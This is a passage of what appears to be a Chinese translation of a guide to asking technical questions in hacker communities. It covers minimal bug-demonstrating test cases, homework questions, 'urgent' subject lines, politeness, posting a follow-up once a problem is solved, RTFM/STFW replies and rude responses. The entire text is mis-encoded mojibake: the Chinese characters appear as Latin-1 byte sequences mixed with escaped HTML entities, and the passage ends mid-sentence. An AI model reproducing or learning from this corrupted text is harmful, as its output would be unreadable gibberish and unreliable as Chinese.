è·å¾—æœ‰ç”¨çš„ç­”æ¡ˆç›¸å½“æœ‰å¸®åŠ© â€”â€” ä½†è¿™æŠ€å·§é€šå¸¸å’Œç®€åŒ–é—®é¢˜æœ‰æ‰€åŒºåˆ«ã€‚å› æ­¤ï¼Œé—®æˆ‘æƒ³æ›´å¥½åœ°ç†è§£ Xï¼Œå¯å¦æŒ‡ç‚¹ä¸€ä¸‹å“ªæœ‰å¥½ä¸€ç‚¹è¯´æ˜ï¼Ÿé€šå¸¸æ¯”é—®ä½ èƒ½è§£é‡Šä¸€ä¸‹ X å—ï¼Ÿæ›´å¥½ã€‚å¦‚æœä½ çš„ä»£ç ä¸èƒ½è¿ä½œï¼Œé€šå¸¸è¯·åˆ«äººçœ‹çœ‹å“ªé‡Œæœ‰é—®é¢˜ï¼Œæ¯”è¦æ±‚åˆ«äººæ›¿ä½ æ”¹æ­£è¦æ˜æ™ºå¾—å¤šã€‚\nè¯¢é—®æœ‰å…³ä»£ç çš„é—®é¢˜æ—¶ å¦‚æœæ²¡æœ‰æç¤ºåˆ«äººåº”è¯¥ä»ä½•å…¥æ‰‹ï¼Œåˆ«è¦æ±‚ä»–äººå¸®ä½ è°ƒè¯•æœ‰é—®é¢˜çš„ä»£ç ã€‚å¼ è´´å‡ ç™¾è¡Œçš„ä»£ç ï¼Œç„¶åè¯´ä¸€å£°ï¼šå®ƒä¸èƒ½å·¥ä½œä¼šè®©ä½ å®Œå…¨è¢«å¿½ç•¥ã€‚åªè´´å‡ åè¡Œä»£ç ï¼Œç„¶åè¯´ä¸€å¥ï¼šåœ¨ç¬¬ä¸ƒè¡Œä»¥åï¼Œæˆ‘æœŸå¾…å®ƒæ˜¾ç¤º \u0026lt;x\u0026gt;ï¼Œä½†å®é™…å‡ºç°çš„æ˜¯ \u0026lt;y\u0026gt;æ¯”è¾ƒæœ‰å¯èƒ½è®©ä½ å¾—åˆ°å›åº”ã€‚\næœ€æœ‰æ•ˆæè¿°ç¨‹åºé—®é¢˜çš„æ–¹æ³•æ˜¯æä¾›æœ€ç²¾ç®€çš„ Bug å±•ç¤ºæµ‹è¯•ç”¨ä¾‹ï¼ˆbug-demonstrating test caseï¼‰ã€‚ä»€ä¹ˆæ˜¯æœ€ç²¾ç®€çš„æµ‹è¯•ç”¨ä¾‹ï¼Ÿé‚£æ˜¯é—®é¢˜çš„ç¼©å½±ï¼›ä¸€å°ä¸ªç¨‹åºç‰‡æ®µèƒ½åˆšå¥½å±•ç¤ºå‡ºç¨‹åºçš„å¼‚å¸¸è¡Œä¸ºï¼Œè€Œä¸åŒ…å«å…¶ä»–ä»¤äººåˆ†æ•£æ³¨æ„åŠ›çš„å†…å®¹ã€‚æ€ä¹ˆåˆ¶ä½œæœ€ç²¾ç®€çš„æµ‹è¯•ç”¨ä¾‹ï¼Ÿå¦‚æœä½ çŸ¥é“å“ªä¸€è¡Œæˆ–å“ªä¸€æ®µä»£ç ä¼šé€ æˆå¼‚å¸¸çš„è¡Œä¸ºï¼Œå¤åˆ¶ä¸‹æ¥å¹¶åŠ å…¥è¶³å¤Ÿé‡ç°è¿™ä¸ªçŠ¶å†µçš„ä»£ç ï¼ˆä¾‹å¦‚ï¼Œè¶³ä»¥è®©è¿™æ®µä»£ç èƒ½è¢«ç¼–è¯‘/ç›´è¯‘/è¢«åº”ç”¨ç¨‹åºå¤„ç†ï¼‰ã€‚å¦‚æœä½ æ— æ³•å°†é—®é¢˜ç¼©å‡åˆ°ä¸€ä¸ªç‰¹å®šåŒºå—ï¼Œå°±å¤åˆ¶ä¸€ä»½ä»£ç å¹¶ç§»é™¤ä¸å½±å“äº§ç”Ÿé—®é¢˜è¡Œä¸ºçš„éƒ¨åˆ†ã€‚æ€»ä¹‹ï¼Œæµ‹è¯•ç”¨ä¾‹è¶Šå°è¶Šå¥½ï¼ˆæŸ¥çœ‹è¯ä¸åœ¨å¤šè€Œåœ¨ç²¾ä¸€èŠ‚ï¼‰ã€‚\nä¸€èˆ¬è€Œè¨€ï¼Œè¦å¾—åˆ°ä¸€æ®µç›¸å½“ç²¾ç®€çš„æµ‹è¯•ç”¨ä¾‹å¹¶ä¸å¤ªå®¹æ˜“ï¼Œä½†æ°¸è¿œå…ˆå°è¯•è¿™æ ·åšæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚è¿™ç§æ–¹å¼å¯ä»¥å¸®åŠ©ä½ äº†è§£å¦‚ä½•è‡ªè¡Œè§£å†³è¿™ä¸ªé—®é¢˜ â€”â€” è€Œä¸”å³ä½¿ä½ çš„å°è¯•ä¸æˆåŠŸï¼Œé»‘å®¢ä»¬ä¹Ÿä¼šçœ‹åˆ°ä½ åœ¨å°è¯•å–å¾—ç­”æ¡ˆçš„è¿‡ç¨‹ä¸­ä»˜å‡ºäº†åŠªåŠ›ï¼Œè¿™å¯ä»¥è®©ä»–ä»¬æ›´æ„¿æ„ä¸ä½ åˆä½œã€‚\nå¦‚æœä½ åªæ˜¯æƒ³è®©åˆ«äººå¸®å¿™å®¡æŸ¥ï¼ˆReviewï¼‰ä¸€ä¸‹ä»£ç ï¼Œåœ¨ä¿¡çš„å¼€å¤´å°±è¦è¯´å‡ºæ¥ï¼Œå¹¶ä¸”ä¸€å®šè¦æåˆ°ä½ è®¤ä¸ºå“ªä¸€éƒ¨åˆ†ç‰¹åˆ«éœ€è¦å…³æ³¨ä»¥åŠä¸ºä»€ä¹ˆã€‚\nåˆ«æŠŠè‡ªå·±å®¶åº­ä½œä¸šçš„é—®é¢˜è´´ä¸Šæ¥ é»‘å®¢ä»¬å¾ˆæ“…é•¿åˆ†è¾¨å“ªäº›é—®é¢˜æ˜¯å®¶åº­ä½œä¸šå¼çš„é—®é¢˜ï¼›å› ä¸ºæˆ‘ä»¬ä¸­çš„å¤§å¤šæ•°éƒ½æ›¾è‡ªå·±è§£å†³è¿™ç±»é—®é¢˜ã€‚åŒæ ·ï¼Œè¿™äº›é—®é¢˜å¾—ç”±ä½ æ¥æå®šï¼Œä½ ä¼šä»ä¸­å­¦åˆ°ä¸œè¥¿ã€‚ä½ å¯ä»¥è¦æ±‚ç»™ç‚¹æç¤ºï¼Œä½†åˆ«è¦æ±‚å¾—åˆ°å®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚\nå¦‚æœä½ æ€€ç–‘è‡ªå·±ç¢°åˆ°äº†ä¸€ä¸ªå®¶åº­ä½œä¸šå¼çš„é—®é¢˜ï¼Œä½†ä»ç„¶æ— æ³•è§£å†³ï¼Œè¯•è¯•åœ¨ç”¨æˆ·ç¾¤ç»„ï¼Œè®ºå›æˆ–ï¼ˆæœ€åä¸€æ‹›ï¼‰åœ¨é¡¹ç›®çš„ç”¨æˆ·é‚®ä»¶åˆ—è¡¨æˆ–è®ºå›ä¸­æé—®ã€‚å°½ç®¡é»‘å®¢ä»¬ä¼šçœ‹å‡ºæ¥ï¼Œä½†ä¸€äº›æœ‰ç»éªŒçš„ç”¨æˆ·ä¹Ÿè®¸ä»ä¼šç»™ä½ ä¸€äº›æç¤ºã€‚\nå»æ‰æ— æ„ä¹‰çš„æé—®å¥ é¿å…ç”¨æ— æ„ä¹‰çš„è¯ç»“æŸæé—®ï¼Œä¾‹å¦‚æœ‰äººèƒ½å¸®æˆ‘å—ï¼Ÿæˆ–è€…è¿™æœ‰ç­”æ¡ˆå—ï¼Ÿã€‚\né¦–å…ˆï¼šå¦‚æœä½ å¯¹é—®é¢˜çš„æè¿°ä¸æ˜¯å¾ˆå¥½ï¼Œè¿™æ ·é—®æ›´æ˜¯ç”»è›‡æ·»è¶³ã€‚\nå…¶æ¬¡ï¼šç”±äºè¿™æ ·é—®æ˜¯ç”»è›‡æ·»è¶³ï¼Œé»‘å®¢ä»¬ä¼šå¾ˆåŒçƒ¦ä½  â€”â€” è€Œä¸”é€šå¸¸ä¼šç”¨é€»è¾‘ä¸Šæ­£ç¡®ï¼Œä½†æ¯«æ— æ„ä¹‰çš„å›ç­”æ¥è¡¨ç¤ºä»–ä»¬çš„è”‘è§†ï¼Œ ä¾‹å¦‚ï¼šæ²¡é”™ï¼Œæœ‰äººèƒ½å¸®ä½ æˆ–è€…ä¸ï¼Œæ²¡ç­”æ¡ˆã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œé¿å…ç”¨ æ˜¯æˆ–å¦ã€å¯¹æˆ–é”™ã€æœ‰æˆ–æ²¡æœ‰ç±»å‹çš„é—®å¥ï¼Œé™¤éä½ æƒ³å¾—åˆ°æ˜¯æˆ–å¦ç±»å‹çš„å›ç­”ã€‚\nå³ä½¿ä½ å¾ˆæ€¥ä¹Ÿä¸è¦åœ¨æ ‡é¢˜å†™ç´§æ€¥ è¿™æ˜¯ä½ çš„é—®é¢˜ï¼Œä¸æ˜¯æˆ‘ä»¬çš„ã€‚å®£ç§°ç´§æ€¥ææœ‰å¯èƒ½äº‹ä¸æ„¿è¿ï¼šå¤§å¤šæ•°é»‘å®¢ä¼šç›´æ¥åˆ é™¤æ— ç¤¼å’Œè‡ªç§åœ°ä¼å›¾å³æ—¶å¼•èµ·å…³æ³¨çš„é—®é¢˜ã€‚æ›´ä¸¥é‡çš„æ˜¯ï¼Œç´§æ€¥è¿™ä¸ªå­—ï¼ˆæˆ–æ˜¯å…¶ä»–ä¼å›¾å¼•èµ·å…³æ³¨çš„æ ‡é¢˜ï¼‰é€šå¸¸ä¼šè¢«åƒåœ¾ä¿¡è¿‡æ»¤å™¨è¿‡æ»¤æ‰ â€”â€” ä½ å¸Œæœ›èƒ½çœ‹åˆ°ä½ é—®é¢˜çš„äººå¯èƒ½æ°¸è¿œä¹Ÿçœ‹ä¸åˆ°ã€‚\næœ‰åŠä¸ªä¾‹å¤–çš„æƒ…å†µæ˜¯ï¼Œå¦‚æœä½ æ˜¯åœ¨ä¸€äº›å¾ˆé«˜è°ƒï¼Œä¼šä½¿é»‘å®¢ä»¬å…´å¥‹çš„åœ°æ–¹ï¼Œä¹Ÿè®¸å€¼å¾—è¿™æ ·å»åšã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä½ æœ‰æ—¶é—´å‹åŠ›ï¼Œä¹Ÿå¾ˆæœ‰ç¤¼è²Œåœ°æåˆ°è¿™ç‚¹ï¼Œäººä»¬ä¹Ÿè®¸ä¼šæœ‰å…´è¶£å›ç­”å¿«ä¸€ç‚¹ã€‚\nå½“ç„¶ï¼Œè¿™é£é™©å¾ˆå¤§ï¼Œå› ä¸ºé»‘å®¢ä»¬å…´å¥‹çš„ç‚¹å¤šåŠä¸ä½ çš„ä¸åŒã€‚è­¬å¦‚ä» NASA å›½é™…ç©ºé—´ç«™ï¼ˆInternational Space Stationï¼‰å‘è¿™æ ·çš„æ ‡é¢˜æ²¡æœ‰é—®é¢˜ï¼Œä½†ç”¨è‡ªæˆ‘æ„Ÿè§‰è‰¯å¥½çš„æ…ˆå–„è¡Œä¸ºæˆ–æ”¿æ²»åŸå› å‘è‚¯å®šä¸è¡Œã€‚äº‹å®ä¸Šï¼Œå¼ è´´è¯¸å¦‚ç´§æ€¥ï¼šå¸®æˆ‘æ•‘æ•‘è¿™ä¸ªæ¯›èŒ¸èŒ¸çš„å°æµ·è±¹ï¼è‚¯å®šè®©ä½ è¢«é»‘å®¢å¿½ç•¥æˆ–æƒ¹æ¼ä»–ä»¬ï¼Œå³ä½¿ä»–ä»¬è®¤ä¸ºæ¯›èŒ¸èŒ¸çš„å°æµ·è±¹å¾ˆé‡è¦ã€‚\nå¦‚æœä½ è§‰å¾—è¿™ç‚¹å¾ˆä¸å¯æ€è®®ï¼Œæœ€å¥½å†æŠŠè¿™ä»½æŒ‡å—å‰©ä¸‹çš„å†…å®¹å¤šè¯»å‡ éï¼Œç›´åˆ°ä½ å¼„æ‡‚äº†å†å‘æ–‡ã€‚\nç¤¼å¤šäººä¸æ€ªï¼Œè€Œä¸”æœ‰æ—¶è¿˜å¾ˆæœ‰å¸®åŠ© å½¬å½¬æœ‰ç¤¼ï¼Œå¤šç”¨è¯·å’Œè°¢è°¢æ‚¨çš„å…³æ³¨ï¼Œæˆ–è°¢è°¢ä½ çš„å…³ç…§ã€‚è®©å¤§å®¶éƒ½çŸ¥é“ä½ å¯¹ä»–ä»¬èŠ±æ—¶é—´å…è´¹æä¾›å¸®åŠ©å¿ƒå­˜æ„Ÿæ¿€ã€‚\nå¦ç™½è¯´ï¼Œè¿™ä¸€ç‚¹å¹¶æ²¡æœ‰æ¯”ä½¿ç”¨æ¸…æ™°ã€æ­£ç¡®ã€ç²¾å‡†ä¸”åˆä¹è¯­æ³•å’Œé¿å…ä½¿ç”¨ä¸“ç”¨æ ¼å¼é‡è¦ï¼ˆä¹Ÿä¸èƒ½å–è€Œä»£ä¹‹ï¼‰ã€‚é»‘å®¢ä»¬ä¸€èˆ¬å®å¯è¯»æœ‰ç‚¹å”çªä½†æŠ€æœ¯ä¸Šé²œæ˜çš„ Bug æŠ¥å‘Šï¼Œè€Œä¸æ˜¯é‚£ç§æœ‰ç¤¼ä½†å«ç³Šçš„æŠ¥å‘Šã€‚ï¼ˆå¦‚æœè¿™ç‚¹è®©ä½ ä¸è§£ï¼Œè®°ä½æˆ‘ä»¬æ˜¯æŒ‰é—®é¢˜èƒ½æ•™ç»™æˆ‘ä»¬ä»€ä¹ˆæ¥è¯„ä»·é—®é¢˜çš„ä»·å€¼çš„ï¼‰\nç„¶è€Œï¼Œå¦‚æœä½ æœ‰ä¸€ä¸²çš„é—®é¢˜å¾…è§£å†³ï¼Œå®¢æ°”ä¸€ç‚¹è‚¯å®šä¼šå¢åŠ ä½ å¾—åˆ°æœ‰ç”¨å›åº”çš„æœºä¼šã€‚\nï¼ˆæˆ‘ä»¬æ³¨æ„åˆ°ï¼Œè‡ªä»æœ¬æŒ‡å—å‘å¸ƒåï¼Œä»èµ„æ·±é»‘å®¢é‚£é‡Œå¾—åˆ°çš„å”¯ä¸€ä¸¥é‡ç¼ºé™·åé¦ˆï¼Œå°±æ˜¯å¯¹é¢„å…ˆé“è°¢è¿™ä¸€æ¡ã€‚ä¸€äº›é»‘å®¢è§‰å¾—å…ˆè°¢äº†æ„å‘³ç€äº‹åå°±ä¸ç”¨å†æ„Ÿè°¢ä»»ä½•äººçš„æš—ç¤ºã€‚æˆ‘ä»¬çš„å»ºè®®æ˜¯è¦ä¹ˆå…ˆè¯´å…ˆè°¢äº†ï¼Œç„¶åäº‹åå†å¯¹å›å¤è€…è¡¨ç¤ºæ„Ÿè°¢ï¼Œæˆ–è€…æ¢ç§æ–¹å¼è¡¨è¾¾æ„Ÿæ¿€ï¼Œè­¬å¦‚ç”¨è°¢è°¢ä½ çš„å…³æ³¨æˆ–è°¢è°¢ä½ çš„å…³ç…§ã€‚ï¼‰\né—®é¢˜è§£å†³åï¼ŒåŠ ä¸ªç®€çŸ­çš„è¡¥å……è¯´æ˜ é—®é¢˜è§£å†³åï¼Œå‘æ‰€æœ‰å¸®åŠ©è¿‡ä½ çš„äººå‘ä¸ªè¯´æ˜ï¼Œè®©ä»–ä»¬çŸ¥é“é—®é¢˜æ˜¯æ€æ ·è§£å†³çš„ï¼Œå¹¶å†ä¸€æ¬¡å‘ä»–ä»¬è¡¨ç¤ºæ„Ÿè°¢ã€‚å¦‚æœé—®é¢˜åœ¨æ–°é—»ç»„æˆ–è€…é‚®ä»¶åˆ—è¡¨ä¸­å¼•èµ·äº†å¹¿æ³›å…³æ³¨ï¼Œåº”è¯¥åœ¨é‚£é‡Œè´´ä¸€ä¸ªè¯´æ˜æ¯”è¾ƒæ°å½“ã€‚\næœ€ç†æƒ³çš„æ–¹å¼æ˜¯å‘æœ€åˆæé—®çš„è¯é¢˜å›å¤æ­¤æ¶ˆæ¯ï¼Œå¹¶åœ¨æ ‡é¢˜ä¸­åŒ…å«å·²ä¿®æ­£ï¼Œå·²è§£å†³æˆ–å…¶å®ƒåŒç­‰å«ä¹‰çš„æ˜æ˜¾æ ‡è®°ã€‚åœ¨äººæ¥äººå¾€çš„é‚®ä»¶åˆ—è¡¨é‡Œï¼Œä¸€ä¸ªçœ‹è§è®¨è®ºä¸²é—®é¢˜ Xå’Œé—®é¢˜ X - å·²è§£å†³çš„æ½œåœ¨å›å¤è€…å°±æ˜ç™½ä¸ç”¨å†æµªè´¹æ—¶é—´äº†ï¼ˆé™¤éä»–ä¸ªäººè§‰å¾—é—®é¢˜ Xæœ‰è¶£ï¼‰ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤æ—¶é—´å»è§£å†³å…¶å®ƒé—®é¢˜ã€‚\nè¡¥å……è¯´æ˜ä¸å¿…å¾ˆé•¿æˆ–æ˜¯å¾ˆæ·±å…¥ï¼›ç®€å•çš„ä¸€å¥ä½ å¥½ï¼ŒåŸæ¥æ˜¯ç½‘çº¿å‡ºäº†é—®é¢˜ï¼è°¢è°¢å¤§å®¶ â€“ Billæ¯”ä»€ä¹ˆä¹Ÿä¸è¯´è¦æ¥çš„å¥½ã€‚äº‹å®ä¸Šï¼Œé™¤éç»“è®ºçœŸçš„å¾ˆæœ‰æŠ€æœ¯å«é‡ï¼Œå¦åˆ™ç®€çŸ­å¯çˆ±çš„å°ç»“æ¯”é•¿ç¯‡å¤§è®ºæ›´å¥½ã€‚è¯´æ˜é—®é¢˜æ˜¯æ€æ ·è§£å†³çš„ï¼Œä½†å¤§å¯ä¸å¿…å°†è§£å†³é—®é¢˜çš„è¿‡ç¨‹å¤è¿°ä¸€éã€‚\nå¯¹äºæœ‰æ·±åº¦çš„é—®é¢˜ï¼Œå¼ è´´è°ƒè¯•è®°å½•çš„æ‘˜è¦æ˜¯æœ‰å¸®åŠ©çš„ã€‚æè¿°é—®é¢˜çš„æœ€ç»ˆçŠ¶æ€ï¼Œè¯´æ˜æ˜¯ä»€ä¹ˆè§£å†³äº†é—®é¢˜ï¼Œåœ¨æ­¤ä¹‹åæ‰æŒ‡æ˜å¯ä»¥é¿å…çš„ç›²ç‚¹ã€‚é¿å…ç›²ç‚¹çš„éƒ¨åˆ†åº”æ”¾åœ¨æ­£ç¡®çš„è§£å†³æ–¹æ¡ˆå’Œå…¶å®ƒæ€»ç»“ææ–™ä¹‹åï¼Œè€Œä¸è¦å°†æ­¤ä¿¡æ¯ææˆä¾¦æ¢æ¨ç†å°è¯´ã€‚åˆ—å‡ºé‚£äº›å¸®åŠ©è¿‡ä½ çš„åå­—ï¼Œä¼šè®©ä½ äº¤åˆ°æ›´å¤šæœ‹å‹ã€‚\né™¤äº†æœ‰ç¤¼è²Œå’Œæœ‰å†…æ¶µä»¥å¤–ï¼Œè¿™ç§ç±»å‹çš„è¡¥å……ä¹Ÿæœ‰åŠ©äºä»–äººåœ¨é‚®ä»¶åˆ—è¡¨/æ–°é—»ç¾¤ç»„/è®ºå›ä¸­æœç´¢åˆ°çœŸæ­£è§£å†³ä½ é—®é¢˜çš„æ–¹æ¡ˆï¼Œè®©ä»–ä»¬ä¹Ÿä»ä¸­å—ç›Šã€‚\nè‡³å°‘ï¼Œè¿™ç§è¡¥å……æœ‰åŠ©äºè®©æ¯ä½å‚ä¸ååŠ©çš„äººå› é—®é¢˜çš„è§£å†³è€Œä»ä¸­å¾—åˆ°æ»¡è¶³æ„Ÿã€‚å¦‚æœä½ è‡ªå·±ä¸æ˜¯æŠ€æœ¯ä¸“å®¶æˆ–è€…é»‘å®¢ï¼Œé‚£å°±ç›¸ä¿¡æˆ‘ä»¬ï¼Œè¿™ç§æ„Ÿè§‰å¯¹äºé‚£äº›ä½ å‘ä»–ä»¬æ±‚åŠ©çš„å¤§å¸ˆæˆ–è€…ä¸“å®¶è€Œè¨€ï¼Œæ˜¯éå¸¸é‡è¦çš„ã€‚é—®é¢˜æ‚¬è€Œæœªå†³ä¼šè®©äººç°å¿ƒï¼›é»‘å®¢ä»¬æ¸´æœ›çœ‹åˆ°é—®é¢˜è¢«è§£å†³ã€‚å¥½äººæœ‰å¥½æŠ¥ï¼Œæ»¡è¶³ä»–ä»¬çš„æ¸´æœ›ï¼Œä½ ä¼šåœ¨ä¸‹æ¬¡æé—®æ—¶å°åˆ°ç”œå¤´ã€‚\næ€è€ƒä¸€ä¸‹æ€æ ·æ‰èƒ½é¿å…ä»–äººå°†æ¥ä¹Ÿé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œè‡ªé—®å†™ä¸€ä»½æ–‡ä»¶æˆ–åŠ ä¸ªå¸¸è§é—®é¢˜ï¼ˆFAQï¼‰ä¼šä¸ä¼šæœ‰å¸®åŠ©ã€‚å¦‚æœæ˜¯çš„è¯å°±å°†å®ƒä»¬å‘ç»™ç»´æŠ¤è€…ã€‚\nåœ¨é»‘å®¢ä¸­ï¼Œè¿™ç§è‰¯å¥½çš„åç»§è¡ŒåŠ¨å®é™…ä¸Šæ¯”ä¼ ç»Ÿçš„ç¤¼èŠ‚æ›´ä¸ºé‡è¦ï¼Œä¹Ÿæ˜¯ä½ å¦‚ä½•é€è¿‡å–„å¾…ä»–äººè€Œèµ¢å¾—å£°èª‰çš„æ–¹å¼ï¼Œè¿™æ˜¯éå¸¸æœ‰ä»·å€¼çš„èµ„äº§ã€‚\nå¦‚ä½•è§£è¯»ç­”æ¡ˆ RTFM å’Œ STFWï¼šå¦‚ä½•çŸ¥é“ä½ å·²å®Œå…¨æç ¸äº† æœ‰ä¸€ä¸ªå¤è€è€Œç¥åœ£çš„ä¼ ç»Ÿï¼šå¦‚æœä½ æ”¶åˆ°RTFMï¼ˆRead The Fucking Manualï¼‰çš„å›åº”ï¼Œå›ç­”è€…è®¤ä¸ºä½ åº”è¯¥å»è¯»ä»–å¦ˆçš„æ‰‹å†Œã€‚å½“ç„¶ï¼ŒåŸºæœ¬ä¸Šä»–æ˜¯å¯¹çš„ï¼Œä½ åº”è¯¥å»è¯»ä¸€è¯»ã€‚\nRTFM æœ‰ä¸€ä¸ªå¹´è½»çš„äº²æˆšã€‚å¦‚æœä½ æ”¶åˆ°STFWï¼ˆSearch The Fucking Webï¼‰çš„å›åº”ï¼Œå›ç­”è€…è®¤ä¸ºä½ åº”è¯¥åˆ°ä»–å¦ˆçš„ç½‘ä¸Šæœç´¢ã€‚é‚£äººå¤šåŠä¹Ÿæ˜¯å¯¹çš„ï¼Œå»æœç´¢ä¸€ä¸‹å§ã€‚ï¼ˆæ›´æ¸©å’Œä¸€ç‚¹çš„è¯´æ³•æ˜¯ Google æ˜¯ä½ çš„æœ‹å‹ï¼ï¼‰\nåœ¨è®ºå›ï¼Œä½ ä¹Ÿå¯èƒ½è¢«è¦æ±‚å»çˆ¬çˆ¬è®ºå›çš„æ—§æ–‡ã€‚äº‹å®ä¸Šï¼Œæœ‰äººç”šè‡³å¯èƒ½çƒ­å¿ƒåœ°ä¸ºä½ æä¾›ä»¥å‰è§£å†³æ­¤é—®é¢˜çš„è®¨è®ºä¸²ã€‚ä½†ä¸è¦ä¾èµ–è¿™ç§å…³ç…§ï¼Œæé—®å‰åº”è¯¥å…ˆæœç´¢ä¸€ä¸‹æ—§æ–‡ã€‚\né€šå¸¸ï¼Œç”¨è¿™ä¸¤å¥ä¹‹ä¸€å›ç­”ä½ çš„äººä¼šç»™ä½ ä¸€ä»½åŒ…å«ä½ éœ€è¦å†…å®¹çš„æ‰‹å†Œæˆ–è€…ä¸€ä¸ªç½‘å€ï¼Œè€Œä¸”ä»–ä»¬æ‰“è¿™äº›å­—çš„æ—¶å€™ä¹Ÿæ­£åœ¨è¯»ç€ã€‚è¿™äº›ç­”å¤æ„å‘³ç€å›ç­”è€…è®¤ä¸ºï¼š\nä½ éœ€è¦çš„ä¿¡æ¯éå¸¸å®¹æ˜“è·å¾—ï¼› ä½ è‡ªå·±å»æœç´¢è¿™äº›ä¿¡æ¯æ¯”çŒç»™ä½ ï¼Œèƒ½è®©ä½ å­¦åˆ°æ›´å¤šã€‚ ä½ ä¸åº”è¯¥å› æ­¤ä¸çˆ½ï¼›ä¾ç…§é»‘å®¢çš„æ ‡å‡†ï¼Œä»–å·²ç»è¡¨ç¤ºäº†å¯¹ä½ ä¸€å®šç¨‹åº¦çš„å…³æ³¨ï¼Œè€Œæ²¡æœ‰å¯¹ä½ çš„è¦æ±‚è§†è€Œä¸è§ã€‚ä½ åº”è¯¥å¯¹ä»–ç¥–æ¯èˆ¬çš„æ…ˆç¥¥è¡¨ç¤ºæ„Ÿè°¢ã€‚\nå¦‚æœè¿˜æ˜¯æä¸æ‡‚ å¦‚æœä½ çœ‹ä¸æ‡‚å›åº”ï¼Œåˆ«ç«‹åˆ»è¦æ±‚å¯¹æ–¹è§£é‡Šã€‚åƒä½ ä»¥å‰è¯•ç€è‡ªå·±è§£å†³é—®é¢˜æ—¶é‚£æ ·ï¼ˆåˆ©ç”¨æ‰‹å†Œï¼ŒFAQï¼Œç½‘ç»œï¼Œèº«è¾¹çš„é«˜æ‰‹ï¼‰ï¼Œå…ˆè¯•ç€å»ææ‡‚ä»–çš„å›åº”ã€‚å¦‚æœä½ çœŸçš„éœ€è¦å¯¹æ–¹è§£é‡Šï¼Œè®°å¾—è¡¨ç°å‡ºä½ å·²ç»ä»ä¸­å­¦åˆ°äº†ç‚¹ä»€ä¹ˆã€‚\næ¯”æ–¹è¯´ï¼Œå¦‚æœæˆ‘å›ç­”ä½ ï¼šçœ‹æ¥ä¼¼ä¹æ˜¯ zentry å¡ä½äº†ï¼›ä½ åº”è¯¥å…ˆæ¸…é™¤å®ƒã€‚ï¼Œç„¶åï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆç³Ÿçš„åç»­é—®é¢˜å›åº”ï¼šzentry æ˜¯ä»€ä¹ˆï¼Ÿ å¥½çš„é—®æ³•åº”è¯¥æ˜¯è¿™æ ·ï¼šå“¦~~~æˆ‘çœ‹è¿‡è¯´æ˜äº†ä½†æ˜¯åªæœ‰ -z å’Œ -p ä¸¤ä¸ªå‚æ•°ä¸­æåˆ°äº† zentriesï¼Œè€Œä¸”è¿˜éƒ½æ²¡æœ‰æ¸…æ¥šçš„è§£é‡Šå¦‚ä½•æ¸…é™¤å®ƒã€‚ä½ æ˜¯æŒ‡è¿™ä¸¤ä¸ªä¸­çš„å“ªä¸€ä¸ªå—ï¼Ÿè¿˜æ˜¯æˆ‘çœ‹æ¼äº†ä»€ä¹ˆï¼Ÿ\nå¤„ç†æ— ç¤¼çš„å›åº” å¾ˆå¤šé»‘å®¢åœˆå­ä¸­çœ‹ä¼¼æ— ç¤¼çš„è¡Œä¸ºå¹¶ä¸æ˜¯å­˜å¿ƒå†’çŠ¯ã€‚ç›¸åï¼Œå®ƒæ˜¯ç›´æˆªäº†å½“ï¼Œä¸€é’ˆè§è¡€å¼çš„äº¤æµé£æ ¼ï¼Œè¿™ç§é£æ ¼æ›´æ³¨é‡è§£å†³é—®é¢˜ï¼Œè€Œä¸æ˜¯ä½¿äººæ„Ÿè§‰èˆ’æœè€Œå´æ¨¡æ¨¡ç³Šç³Šã€‚\nå¦‚æœä½ è§‰å¾—è¢«å†’çŠ¯äº†ï¼Œè¯•ç€å¹³é™åœ°ååº”ã€‚å¦‚æœæœ‰äººçœŸçš„åšäº†å‡ºæ ¼çš„äº‹ï¼Œé‚®ä»¶åˆ—è¡¨ã€æ–°é—»ç¾¤ç»„æˆ–è®ºå›ä¸­çš„å‰è¾ˆå¤šåŠä¼šæ‹›å‘¼ä»–ã€‚å¦‚æœè¿™æ²¡æœ‰å‘ç”Ÿè€Œä½ å´å‘ç«äº†ï¼Œé‚£ä¹ˆä½ å‘ç«å¯¹è±¡çš„è¨€è¯­å¯èƒ½åœ¨é»‘å®¢ç¤¾åŒºä¸­çœ‹èµ·æ¥æ˜¯æ­£å¸¸çš„ï¼Œè€Œä½ å°†è¢«è§†ä¸ºæœ‰é”™çš„ä¸€æ–¹ï¼Œè¿™å°†ä¼¤å®³åˆ°ä½ è·å–ä¿¡æ¯æˆ–å¸®åŠ©çš„æœºä¼šã€‚\nå¦ä¸€æ–¹é¢ï¼Œä½ å¶å°”çœŸçš„ä¼šç¢°åˆ°æ— ç¤¼å’Œæ— èŠçš„è¨€è¡Œã€‚ä¸ä¸Šè¿°ç›¸åï¼Œå¯¹çœŸæ­£çš„å†’çŠ¯è€…ç‹ ç‹ åœ°æ‰“å‡»ï¼Œç”¨çŠ€åˆ©çš„è¯­è¨€å°†å…¶é©³å¾—ä½“æ— å®Œè‚¤éƒ½æ˜¯å¯ä»¥æ¥å—çš„ã€‚ç„¶è€Œï¼Œåœ¨è¡Œäº‹ä¹‹å‰ä¸€å®šè¦éå¸¸éå¸¸çš„æœ‰æ ¹æ®ã€‚çº æ­£æ— ç¤¼çš„è¨€è®ºä¸å¼€å§‹ä¸€åœºæ¯«æ— æ„ä¹‰çš„å£æ°´æˆ˜ä»…ä¸€çº¿ä¹‹éš”ï¼Œé»‘å®¢ä»¬è‡ªå·±è½æ’åœ°è¶Šçº¿çš„æƒ…å†µå¹¶ä¸é²œè§ã€‚å¦‚æœä½ æ˜¯æ–°æ‰‹æˆ–å¤–äººï¼Œé¿å¼€è¿™ç§è½æ’çš„æœºä¼šå¹¶ä¸é«˜ã€‚å¦‚æœä½ æƒ³å¾—åˆ°çš„æ˜¯ä¿¡æ¯è€Œä¸æ˜¯æ¶ˆç£¨æ—¶å…‰ï¼Œè¿™æ—¶æœ€å¥½ä¸è¦æŠŠæ‰‹æ”¾åœ¨é”®ç›˜ä¸Šä»¥å…å†’é™©ã€‚\nï¼ˆæœ‰äº›äººæ–­è¨€å¾ˆå¤šé»‘å®¢éƒ½æœ‰è½»åº¦çš„è‡ªé—­ç—‡æˆ–äºšæ–¯ä¼¯æ 